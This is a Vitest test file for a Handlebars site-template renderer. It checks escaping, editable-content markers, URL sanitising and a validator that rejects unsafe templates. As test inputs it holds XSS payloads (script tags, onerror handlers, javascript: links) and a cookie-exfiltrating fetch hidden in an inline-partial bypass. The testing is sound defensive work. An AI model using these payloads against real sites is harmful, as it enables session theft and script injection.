import { describe, it, expect } from 'vitest';
import { renderTemplate, validateTemplate, editsAreBodyOnly, TemplateError, type TemplateContext } from '../src/template.js';

const ctx: TemplateContext = {
  company: { name: 'Acme & Co', address: { city: 'Berlin' } },
  website: { siteUrl: 'https://acme.test' },
  page: { title: 'Home', published: '2026-06-01T12:00:00Z' },
  data: {
    products: [
      { name: 'Widget', price: 9 },
      { name: 'Gadget', price: 12 },
    ],
    tags: ['a', 'b'],
    featured: true,
    empty: [],
  },
};

describe('{{edit}} — client-editable bound content', () => {
  it('renders the default when no override is set for the key', () => {
    expect(renderTemplate('<h1>{{edit "headline" "Welcome"}}</h1>', ctx)).toBe('<h1>Welcome</h1>');
  });

  it('renders the content override when present, falling back per-key', () => {
    const c: TemplateContext = { ...ctx, content: { headline: 'Hello there' } };
    expect(renderTemplate('<h1>{{edit "headline" "Welcome"}}</h1><p>{{edit "sub" "Default sub"}}</p>', c)).toBe(
      '<h1>Hello there</h1><p>Default sub</p>',
    );
  });

  it('HTML-escapes the (client-authored) override — no markup injection', () => {
    const c: TemplateContext = { ...ctx, content: { x: '<script>alert(1)</script>' } };
    expect(renderTemplate('<div>{{edit "x" "d"}}</div>', c)).toBe(
      '<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>',
    );
  });

  it('treats an empty default + missing override as empty, and ignores a non-own key', () => {
    expect(renderTemplate('<p>{{edit "missing"}}</p>', ctx)).toBe('<p></p>');
    // A key that only exists on Object.prototype must not leak (no proto access).
    expect(renderTemplate('<p>{{edit "toString" "fallback"}}</p>', ctx)).toBe('<p>fallback</p>');
  });

  it('passes the save-time validator in body context', () => {
    expect(() => validateTemplate('<h1>{{edit "k" "Some default text"}}</h1>')).not.toThrow();
  });
});

describe('{{edit}} preview markers (markEdits)', () => {
  it('wraps each region in a data-sw-edit span ONLY when markEdits is set', () => {
    expect(renderTemplate('<h1>{{edit "title" "Welcome"}}</h1>', ctx)).toBe('<h1>Welcome</h1>'); // off → plain
    expect(renderTemplate('<h1>{{edit "title" "Welcome"}}</h1>', { ...ctx, markEdits: true })).toBe(
      '<h1><span data-sw-edit="title">Welcome</span></h1>',
    );
  });

  it('keeps the (client-authored) value HTML-escaped inside the marker — no XSS', () => {
    const c: TemplateContext = { ...ctx, markEdits: true, content: { x: '<img src=x onerror=alert(1)>' } };
    expect(renderTemplate('<div>{{edit "x" "d"}}</div>', c)).toBe(
      '<div><span data-sw-edit="x">&lt;img src=x onerror=alert(1)&gt;</span></div>',
    );
  });
});

describe('{{#eachEntry}} — dataset rows with preview markers', () => {
  const items = [
    { id: 'e1', dataset: 'posts', values: { t: 'A' } },
    { id: 'e2', dataset: 'posts', values: { t: 'B' } },
  ];
  const src = '<ul>{{#eachEntry data.posts}}<li>{{this.values.t}}</li>{{else}}<li>none</li>{{/eachEntry}}</ul>';

  it('wraps each row in a data-sw-entry marker ONLY when markEntries is set', () => {
    expect(renderTemplate(src, { data: { posts: items }, markEntries: true })).toBe(
      '<ul><div data-sw-entry="e1" data-sw-dataset="posts"><li>A</li></div><div data-sw-entry="e2" data-sw-dataset="posts"><li>B</li></div></ul>',
    );
  });

  it('is a transparent passthrough (byte-identical to {{#each}}) without markEntries', () => {
    const eachSrc = '<ul>{{#each data.posts}}<li>{{this.values.t}}</li>{{else}}<li>none</li>{{/each}}</ul>';
    expect(renderTemplate(src, { data: { posts: items } })).toBe(renderTemplate(eachSrc, { data: { posts: items } }));
    expect(renderTemplate(src, { data: { posts: items } })).toBe('<ul><li>A</li><li>B</li></ul>');
  });

  it('renders the {{else}} inverse for an empty list', () => {
    expect(renderTemplate(src, { data: { posts: [] }, markEntries: true })).toBe('<ul><li>none</li></ul>');
  });
});

describe('editsAreBodyOnly — inline-edit marker gate', () => {
  it('is true when every {{edit}} sits in element-body text', () => {
    expect(editsAreBodyOnly('<h1>{{edit "t"}}</h1><p>{{edit "b" "x"}}</p>')).toBe(true);
    expect(editsAreBodyOnly('plain {{edit "t"}} text')).toBe(true);
    expect(editsAreBodyOnly('<div title="ok">{{edit "t"}}</div>')).toBe(true); // edit is in body; the attr is literal
  });

  it('is false when an {{edit}} sits in an attribute / style / comment (a span would break out)', () => {
    expect(editsAreBodyOnly('<a title="{{edit "t"}}">x</a>')).toBe(false);
    expect(editsAreBodyOnly('<img alt="{{edit "a"}}">')).toBe(false);
    expect(editsAreBodyOnly('<style>.x::before{content:"{{edit "c"}}"}</style>')).toBe(false);
    expect(editsAreBodyOnly('<!-- {{edit "c"}} -->')).toBe(false);
    // A `>` INSIDE a quoted attribute value must not prematurely end the tag.
    expect(editsAreBodyOnly('<a title="a > b {{edit "t"}}">x</a>')).toBe(false);
  });

  it('is false for raw output or malformed source (conservative — no markers)', () => {
    expect(editsAreBodyOnly('{{{ raw }}}')).toBe(false);
    expect(editsAreBodyOnly('<h1>{{edit "t"')).toBe(false);
    // A malformed style closer (`</style` without `>`) must not be treated as leaving the block.
    expect(editsAreBodyOnly('<style>.x{}</style{{edit "y"}}></style>')).toBe(false);
    // A proper close ends the rawtext block — a following body {{edit}} is then editable.
    expect(editsAreBodyOnly('<style>.x{}</style><p>{{edit "y"}}</p>')).toBe(true);
  });
});

describe('renderTemplate — Handlebars features', () => {
  it('passes literal HTML through and interpolates + HTML-escapes values', () => {
    expect(renderTemplate('<div class="grid">{{ page.title }}</div>', ctx)).toBe('<div class="grid">Home</div>');
    expect(renderTemplate('{{ company.name }}', ctx)).toBe('Acme &amp; Co');
    expect(renderTemplate('{{ company.address.city }}', ctx)).toBe('Berlin');
  });

  it('escapes an HTML-bearing value (XSS-safe in body/quoted attr)', () => {
    expect(renderTemplate('{{ page.t }}', { page: { t: '<script>alert(1)</script>' } })).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;',
    );
  });

  it('supports {{#if}}/{{else}} and {{#unless}}', () => {
    expect(renderTemplate('{{#if data.featured}}Y{{else}}N{{/if}}', ctx)).toBe('Y');
    expect(renderTemplate('{{#if data.empty}}Y{{else}}N{{/if}}', ctx)).toBe('N');
    expect(renderTemplate('{{#unless page.missing}}ok{{/unless}}', ctx)).toBe('ok');
  });

  it('supports {{#each}} with @index/@first/@last and item fields', () => {
    expect(renderTemplate('{{#each data.products}}{{@index}}:{{name}}{{#unless @last}}, {{/unless}}{{/each}}', ctx)).toBe(
      '0:Widget, 1:Gadget',
    );
    expect(renderTemplate('{{#each data.tags}}[{{this}}]{{/each}}', ctx)).toBe('[a][b]');
  });

  it('supports {{#each}} @key over an object and block params', () => {
    const c: TemplateContext = { data: { obj: { a: 1, b: 2 } } };
    expect(renderTemplate('{{#each data.obj as |v k|}}{{k}}={{v}};{{/each}}', c)).toBe('a=1;b=2;');
  });

  it('supports {{#with}}, {{lookup}}, subexpressions, and @root', () => {
    expect(renderTemplate('{{#with company.address}}{{city}}{{/with}}', ctx)).toBe('Berlin');
    expect(renderTemplate('{{#each data.products}}{{ lookup ../data.tags @index }}{{/each}}', ctx)).toBe('ab');
    expect(renderTemplate('{{#each data.products}}{{ @root.company.name }} {{/each}}', ctx)).toBe('Acme &amp; Co Acme &amp; Co ');
  });

  it('renders partials in the current scope (incl. inside each)', () => {
    const c: TemplateContext = { ...ctx, partials: { card: '<li>{{name}} ({{price}})</li>' } };
    expect(renderTemplate('<ul>{{#each data.products}}{{> card}}{{/each}}</ul>', c)).toBe(
      '<ul><li>Widget (9)</li><li>Gadget (12)</li></ul>',
    );
  });

  it('VALIDATES partial sources too (an unsafe partial is rejected, not just the main template)', () => {
    const c: TemplateContext = { partials: { evil: '<script>steal()</script>' } };
    expect(() => renderTemplate('<div>{{> evil}}</div>', c)).toThrow(TemplateError);
  });

  it('turns a circular {{> partial}} chain into a clear error (not a worker crash)', () => {
    const c: TemplateContext = { partials: { a: '{{> b}}', b: '{{> a}}' } };
    expect(() => renderTemplate('{{> a}}', c)).toThrow(/circular|partial/i);
  });
});

describe('renderTemplate — curated helpers (extensibility)', () => {
  it('{{date}} formats a date (default + iso)', () => {
    expect(renderTemplate('{{date page.published}}', ctx)).toBe('2026-06-01');
    expect(renderTemplate('{{date page.published "iso"}}', ctx)).toBe('2026-06-01T12:00:00.000Z');
    expect(renderTemplate('{{date page.nope}}', ctx)).toBe('');
  });

  it('{{url}} sanitizes the scheme', () => {
    expect(renderTemplate('<a href="{{url page.link}}">x</a>', { page: { link: 'javascript:alert(1)' } })).toBe(
      '<a href="#">x</a>',
    );
    expect(renderTemplate('<a href="{{url page.link}}">x</a>', { page: { link: 'https://ok.test/a' } })).toBe(
      '<a href="https://ok.test/a">x</a>',
    );
  });

  it('{{truncate}} clips long text', () => {
    expect(renderTemplate('{{truncate page.t 5}}', { page: { t: 'abcdefgh' } })).toBe('abcd…');
    expect(renderTemplate('{{truncate page.t 5}}', { page: { t: 'abc' } })).toBe('abc');
  });

  it('{{icon}} inlines a built-in SVG (trusted body, escaped class), empty for unknown', () => {
    const out = renderTemplate('{{icon "arrow-right" "h-5 w-5"}}', ctx);
    expect(out).toContain('<svg class="h-5 w-5"');
    expect(out).toContain('stroke="currentColor"');
    expect(out).toContain('aria-hidden="true"');
    expect(out).toContain('<path d="M5 12h14"'); // arrow-right body, emitted raw (SafeString)
    // Unknown icon → nothing (never reflects the name).
    expect(renderTemplate('[{{icon "does-not-exist"}}]', ctx)).toBe('[]');
    // The class is attribute-escaped (no breakout possible).
    expect(renderTemplate('{{icon "check" "a\\"onerror=x"}}', ctx)).not.toContain('"onerror=x');
  });
});

describe('renderTemplate — security', () => {
  it('disables prototype access', () => {
    expect(renderTemplate('[{{ company.constructor }}]', ctx)).toBe('[]');
    expect(renderTemplate('[{{ company.__proto__ }}]', ctx)).toBe('[]');
  });

  it('does not re-evaluate a value that looks like a tag (no injection from data)', () => {
    const c: TemplateContext = { page: { title: '{{ company.secret }}' }, company: { secret: 'LEAK' } };
    expect(renderTemplate('{{ page.title }}', c)).toBe('{{ company.secret }}');
  });

  it('caps output size', () => {
    const c: TemplateContext = { data: { items: Array.from({ length: 5000 }, () => 'xxxxxxxxxx') } };
    expect(() => renderTemplate('{{#each data.items}}{{this}}{{/each}}', c, { maxOutput: 1000 })).toThrow(TemplateError);
  });
});

describe('validateTemplate — context-aware rejection (Handlebars is not context-aware)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('bans raw {{{ }}} output', () => {
    rejects('<p>{{{ page.html }}}</p>');
  });

  it('rejects interpolation in an unquoted attribute', () => {
    rejects('<div class={{ data.cls }}>x</div>');
  });

  it('rejects interpolation in event-handler and style attributes', () => {
    rejects('<button onclick="{{ data.x }}">x</button>');
    rejects('<div style="color:{{ data.c }}">x</div>');
  });

  it('rejects interpolation in <script>, <style>, and HTML comments', () => {
    rejects('<script>var x = {{ data.x }};</script>');
    rejects('<style>.a { color: {{ data.c }} }</style>');
    rejects('<!-- {{ page.title }} -->');
  });

  it('requires {{url …}} (not a bare value) inside URL attributes', () => {
    rejects('<a href="{{ page.link }}">x</a>');
    allows('<a href="{{url page.link}}">x</a>');
    allows('<a href="/p/{{ page.slug }}">x</a>'); // literal prefix fixes the scheme → allowed
  });

  it('allows interpolation in element text and quoted non-URL attributes', () => {
    allows('<p data-x="{{ data.v }}">{{ data.v }}</p>');
    allows('{{#each data.products}}<span>{{name}}</span>{{/each}}'); // block tags are not output mustaches
  });

  it('renderTemplate runs the validator (rejects an unsafe template before rendering)', () => {
    expect(() => renderTemplate('<div class={{ data.cls }}>x</div>', ctx)).toThrow(TemplateError);
  });
});

describe('validateTemplate — no tenant JS + URL scheme (security-review fixes)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects a <script> element even with no interpolation', () => {
    rejects('<p>hi</p><script>alert(1)</script>');
  });

  it('rejects a <script> hidden inside an {{#*inline}} partial body (the inline-partial bypass)', () => {
    rejects('{{#*inline "x"}}<script>fetch("//e/"+document.cookie)</script>{{/inline}}{{> x}}');
  });

  it('rejects inline on* event-handler attributes (literal or interpolated)', () => {
    rejects('<div onmouseover="steal()">x</div>');
    rejects('<button onclick="{{ data.x }}">x</button>');
  });

  it('rejects a URL whose scheme a bare literal prefix does NOT fix', () => {
    rejects('<a href="j{{ data.rest }}">x</a>'); // assembles javascript:
    rejects('<a href="//{{ data.host }}">x</a>'); // protocol-relative
    rejects('<img src="data:{{ data.b64 }}">'); // data: scheme
  });

  it('still allows safe URL prefixes and the {{url}} helper', () => {
    allows('<a href="/p/{{ page.slug }}">x</a>');
    allows('<a href="https://x.test/{{ page.slug }}">x</a>');
    allows('<a href="#{{ page.frag }}">x</a>');
    allows('<a href="{{url page.link}}">x</a>');
  });

  it('neuters the {{log}} helper (no stdout disclosure)', () => {
    // log is unregistered → {{log x}} no longer writes the value to stdout; it errors instead.
    expect(() => renderTemplate('{{log company.name}}', { company: { name: 'Acme' } })).toThrow(TemplateError);
  });
});
